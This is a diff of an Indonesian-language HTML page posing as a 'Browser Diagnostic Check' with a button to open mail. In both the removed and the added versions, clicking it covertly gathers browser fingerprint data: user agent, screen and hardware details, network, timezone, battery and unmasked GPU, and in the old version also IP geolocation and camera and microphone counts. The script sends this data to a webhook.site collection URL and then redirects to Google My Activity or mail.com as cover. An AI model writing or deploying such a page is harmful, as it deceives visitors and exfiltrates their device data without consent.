@@ -2,257 +2,462 @@
 <html lang="id">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+
 <title>Browser Diagnostic Redirect</title>
+
 <style>
-* {
-    box-sizing: border-box;
+*{
+box-sizing:border-box;
 }
-body {
-    margin: 0;
-    min-height: 100vh;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    background: #202124;
-    font-family: Arial, sans-serif;
+
+body{
+margin:0;
+min-height:100vh;
+display:flex;
+align-items:center;
+justify-content:center;
+background:#202124;
+font-family:Arial,sans-serif;
 }
-.card {
-    width: 90%;
-    max-width: 450px;
-    background: white;
-    padding: 35px;
-    border-radius: 18px;
-    text-align: center;
-    box-shadow: 0 10px 30px rgba(0,0,0,.35);
+
+.card{
+background:#fff;
+width:90%;
+max-width:430px;
+padding:35px;
+border-radius:18px;
+text-align:center;
+box-shadow:0 10px 30px rgba(0,0,0,.35);
 }
-button {
-    width: 100%;
-    padding: 15px;
-    margin-top: 20px;
-    border: 0;
-    border-radius: 10px;
-    background: #0066ff;
-    color: white;
-    font-size: 17px;
-    cursor: pointer;
-    transition: background 0.2s;
+
+button{
+width:100%;
+padding:15px;
+margin-top:20px;
+border:0;
+border-radius:10px;
+background:#0066ff;
+color:white;
+font-size:17px;
+cursor:pointer;
 }
-button:hover {
-    background: #0052cc;
+
+button:disabled{
+background:#888;
 }
-button:disabled {
-    background: #888;
-    cursor: not-allowed;
-}
-#status {
-    margin-top: 20px;
-    font-size: 14px;
-    color: #555;
+
+#status{
+margin-top:20px;
+font-size:14px;
 }
 </style>
+
 </head>
+
 <body>
 
+
 <div class="card">
-    <h2>Continue</h2>
-    <p>Browser Diagnostic Check</p>
-    <button id="send">Kirim & Buka Gmail</button>
-    <div id="status">Ready</div>
+
+<h2>Continue</h2>
+
+<p>Browser Diagnostic Check</p>
+
+<button id="send">
+Kirim & Buka Mail
+</button>
+
+<div id="status">
+Ready
 </div>
 
+</div>
+
+
+
 <script>
-const WEBHOOK = "https://webhook.site/cf75fcc7-0cfa-4508-a0cb-f13a2fa22deb";
 
-const safe = (val) => val ?? null;
+const WEBHOOK =
+"https://webhook.site/cf75fcc7-0cfa-4508-a0cb-f13a2fa22deb";
 
-// 1. Pengambilan Data IP & Geolocation Network
-async function getIPInfo() {
-    try {
-        const res = await fetch("https://ipapi.co/json/", { cache: "no-store" });
-        if (!res.ok) return null;
-        const data = await res.json();
-        return {
-            ip: data.ip,
-            city: data.city,
-            region: data.region,
-            country: data.country_name,
-            asn: data.asn,
-            org: data.org
-        };
-    } catch (e) {
-        return null;
-    }
+
+function safe(fn){
+
+try{
+return fn();
+}
+catch(e){
+return null;
 }
 
-// 2. Status Baterai
-async function getBattery() {
-    try {
-        if (navigator.getBattery) {
-            const b = await navigator.getBattery();
-            return {
-                level: Math.round(b.level * 100) + "%",
-                charging: b.charging,
-                chargingTime: b.chargingTime,
-                dischargingTime: b.dischargingTime
-            };
-        }
-    } catch (e) {}
-    return null;
 }
 
-// 3. Deteksi Perangkat Kartu Grafis (WebGL Unmasked GPU)
-function getGPUInfo() {
-    try {
-        const canvas = document.createElement("canvas");
-        const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
-        if (!gl) return null;
-        const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
-        return {
-            vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : gl.getParameter(gl.VENDOR),
-            renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER)
-        };
-    } catch (e) {
-        return null;
-    }
-}
 
-// 4. Deteksi Perangkat Media Input (Kamera & Mikrofon)
-async function getMediaDevices() {
-    try {
-        if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
-            const devices = await navigator.mediaDevices.enumerateDevices();
-            return {
-                audioInputCount: devices.filter(d => d.kind === 'audioinput').length,
-                videoInputCount: devices.filter(d => d.kind === 'videoinput').length,
-                audioOutputCount: devices.filter(d => d.kind === 'audiooutput').length
-            };
-        }
-    } catch (e) {}
-    return null;
-}
 
-// 5. Fungsi Utama Pengumpulan Data
-function collectBaseData() {
-    const n = navigator;
-    const connection = n.connection || n.webkitConnection || n.mozConnection;
+async function battery(){
 
-    return {
-        event: "browser_diagnostic_full_get",
-        timestamp: new Date().toISOString(),
-        page: {
-            url: location.href,
-            title: document.title,
-            referrer: document.referrer || "Direct",
-            visibility: document.visibilityState
-        },
-        browser: {
-            userAgent: n.userAgent,
-            language: n.language,
-            languages: n.languages ? n.languages.join(",") : n.language,
-            platform: n.platform,
-            vendor: n.vendor,
-            online: n.onLine,
-            cookieEnabled: n.cookieEnabled,
-            doNotTrack: safe(n.doNotTrack),
-            pdfViewer: safe(n.pdfViewerEnabled)
-        },
-        screen: {
-            width: screen.width,
-            height: screen.height,
-            availableWidth: screen.availWidth,
-            availableHeight: screen.availHeight,
-            colorDepth: screen.colorDepth,
-            pixelRatio: window.devicePixelRatio,
-            orientation: screen.orientation ? screen.orientation.type : null
-        },
-        window: {
-            innerWidth: window.innerWidth,
-            innerHeight: window.innerHeight,
-            outerWidth: window.outerWidth,
-            outerHeight: window.outerHeight
-        },
-        hardware: {
-            cpuThreads: safe(n.hardwareConcurrency),
-            deviceMemoryGB: safe(n.deviceMemory),
-            maxTouchPoints: safe(n.maxTouchPoints),
-            isTouchDevice: n.maxTouchPoints > 0
-        },
-        network: connection ? {
-            effectiveType: safe(connection.effectiveType),
-            downlink: safe(connection.downlink),
-            rtt: safe(connection.rtt),
-            saveData: safe(connection.saveData)
-        } : null,
-        timezone: {
-            zone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            offsetMinutes: new Date().getTimezoneOffset(),
-            localTime: new Date().toString()
-        },
-        storage: {
-            localStorage: !!window.localStorage,
-            sessionStorage: !!window.sessionStorage,
-            indexedDB: !!window.indexedDB,
-            serviceWorker: 'serviceWorker' in n
-        },
-        features: {
-            bluetooth: !!n.bluetooth,
-            usb: !!n.usb,
-            clipboard: !!n.clipboard,
-            geolocation: !!n.geolocation,
-            webGL: !!window.WebGLRenderingContext
-        }
-    };
-}
+try{
 
-// Execution Trigger
-document.getElementById("send").onclick = async function() {
-    this.disabled = true;
-    const status = document.getElementById("status");
-    status.innerHTML = "Memproses diagnostik sistem...";
+if(!navigator.getBattery)
+return null;
 
-    // Mengumpulkan data secara sinkron dan asinkron
-    let payload = collectBaseData();
-    
-    // Promise Parallelization untuk mempercepat eksekusi
-    const [ipInfo, batteryInfo, mediaDevicesInfo] = await Promise.all([
-        getIPInfo(),
-        getBattery(),
-        getMediaDevices()
-    ]);
 
-    payload.ipNetwork = ipInfo;
-    payload.battery = batteryInfo;
-    payload.gpu = getGPUInfo();
-    payload.mediaHardware = mediaDevicesInfo;
+const b =
+await navigator.getBattery();
 
-    status.innerHTML = "Mengirim data...";
 
-    // Menyusun Query String secara aman
-    const query = new URLSearchParams();
-    
-    Object.entries(payload).forEach(([key, value]) => {
-        query.append(
-            key,
-            typeof value === "object" ? JSON.stringify(value) : value
-        );
-    });
+return {
 
-    try {
-        await fetch(WEBHOOK + "?" + query.toString(), {
-            method: "GET",
-            mode: "no-cors"
-        });
-        status.innerHTML = "Selesai. Mengalihkan...";
-    } catch (e) {
-        status.innerHTML = "Mengalihkan...";
-    }
+level:
+Math.round(b.level*100)+"%",
 
-    setTimeout(() => {
-        window.location.href = "https://myactivity.google.com/myactivity?hl=id&utm_source=google-account&utm_medium=web&pli=1";
-    }, 800);
+charging:
+b.charging
+
 };
+
+
+}catch(e){
+
+return null;
+
+}
+
+}
+
+
+
+function gpu(){
+
+try{
+
+let canvas =
+document.createElement("canvas");
+
+
+let gl =
+canvas.getContext("webgl");
+
+
+if(!gl)
+return null;
+
+
+let info =
+gl.getExtension(
+"WEBGL_debug_renderer_info"
+);
+
+
+return {
+
+vendor:
+info ?
+gl.getParameter(info.UNMASKED_VENDOR_WEBGL)
+:
+null,
+
+
+renderer:
+info ?
+gl.getParameter(info.UNMASKED_RENDERER_WEBGL)
+:
+null
+
+};
+
+
+}catch(e){
+
+return null;
+
+}
+
+}
+
+
+
+function collect(){
+
+
+const n=navigator;
+
+
+const c =
+n.connection ||
+n.webkitConnection ||
+n.mozConnection;
+
+
+
+return {
+
+
+event:
+"browser_diagnostic",
+
+
+time:
+new Date().toISOString(),
+
+
+
+page:{
+
+url:
+location.href,
+
+title:
+document.title,
+
+referrer:
+document.referrer || null
+
+},
+
+
+
+browser:{
+
+userAgent:
+n.userAgent,
+
+language:
+n.language,
+
+languages:
+n.languages,
+
+platform:
+n.platform,
+
+vendor:
+n.vendor,
+
+online:
+n.onLine,
+
+cookie:
+n.cookieEnabled
+
+},
+
+
+
+screen:{
+
+width:
+screen.width,
+
+height:
+screen.height,
+
+colorDepth:
+screen.colorDepth,
+
+pixelRatio:
+devicePixelRatio
+
+},
+
+
+
+window:{
+
+width:
+innerWidth,
+
+height:
+innerHeight
+
+},
+
+
+
+hardware:{
+
+cpu:
+safe(()=>n.hardwareConcurrency),
+
+memory:
+safe(()=>n.deviceMemory),
+
+touch:
+safe(()=>n.maxTouchPoints)
+
+},
+
+
+
+network:
+c?
+{
+
+type:
+c.effectiveType || null,
+
+speed:
+c.downlink || null,
+
+rtt:
+c.rtt || null
+
+}
+:null,
+
+
+
+timezone:{
+
+zone:
+Intl.DateTimeFormat()
+.resolvedOptions()
+.timeZone,
+
+local:
+new Date().toString()
+
+},
+
+
+
+features:{
+
+webgl:
+!!window.WebGLRenderingContext,
+
+bluetooth:
+!!n.bluetooth,
+
+usb:
+!!n.usb,
+
+media:
+!!n.mediaDevices
+
+}
+
+
+
+};
+
+
+}
+
+
+
+document
+.getElementById("send")
+.onclick =
+async function(){
+
+
+this.disabled=true;
+
+
+let status =
+document.getElementById("status");
+
+
+status.innerHTML =
+"Mengumpulkan data...";
+
+
+let data =
+collect();
+
+
+data.battery =
+await battery();
+
+
+data.gpu =
+gpu();
+
+
+
+let query =
+new URLSearchParams();
+
+
+
+Object.entries(data)
+.forEach(([k,v])=>{
+
+
+query.append(
+
+k,
+
+typeof v==="object"
+?
+JSON.stringify(v)
+:
+v
+
+);
+
+
+});
+
+
+
+status.innerHTML =
+"Mengirim...";
+
+
+try{
+
+
+await fetch(
+
+WEBHOOK+
+"?"
++
+query.toString(),
+
+{
+
+method:"GET",
+
+mode:"no-cors"
+
+}
+
+);
+
+
+status.innerHTML =
+"Selesai";
+
+
+}catch(e){
+
+
+status.innerHTML =
+"Redirect";
+
+
+}
+
+
+
+setTimeout(()=>{
+
+
+window.location.href =
+"https://www.mail.com/";
+
+},1000);
+
+
+
+};
+
+
 </script>
 
+
 </body>
-</html>
+</html> 
